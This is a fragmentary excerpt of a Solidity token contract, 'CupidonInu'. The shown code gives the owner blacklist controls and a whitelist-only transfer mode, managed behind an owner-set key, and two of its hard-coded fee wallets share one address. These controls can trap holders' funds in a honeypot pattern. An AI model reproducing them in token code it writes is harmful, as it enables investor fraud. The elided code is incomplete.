...
contract CupidonInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable private marketingAddress =
        payable(0xbe611FC9cfBE78446564aB3425154B4797D84f96); // Marketing Address
        
    address payable private teamAddress =
        payable(0x6723214d618aC9757F83E0466997d0836c6533b9); // Team Address
        
    address payable private liquidityAddress =
        payable(0xbe611FC9cfBE78446564aB3425154B4797D84f96); // Liquidity Address
    ...
    string private constant _name = "CupidonInu";
    string private constant _symbol = "CupidonInu";
    ...
    function _transfer(
        ...
        require(!_isBlacklisted[from], "Blacklisted address.");
          ...
          if(whitelistEnabled){
        require(getWhiteliststatus(from), "Transfer  is not valid, Sender not whitelisted");
         require(getWhiteliststatus(to), "Transfer  is not valid, Recipient not whitelisted");}
...
//add Single whitelist Address. 1 in _whiteliststatus  is to whitelist and 0 is to blacklist 
    function AddwhitelistAdr(address _addr, uint256 _whiteliststatus ,bytes32 _addkey) onlyOwner  public{
     
      require( Addkey==_addkey ,"Whitelist Key not matching");
        WhitelistAdrID[_addr] = _whiteliststatus;
    }



    //add multiple whitelist Address. 1 in _whiteliststatus  is to whitelist and 0 is to blacklist 
    function AddmultiplewhitelistAdr(address[] calldata _addr, uint256 _whiteliststatus ,bytes32 _addkey) onlyOwner  public{
     
      require( Addkey==_addkey ,"Whitelist Key not matching");

      for (uint i = 0; i < _addr.length; i++) {
             WhitelistAdrID[_addr[i]] = _whiteliststatus;
        }
...
return false;
    ...
    function addkey(bytes32 _addkey) onlyOwner  public{ 
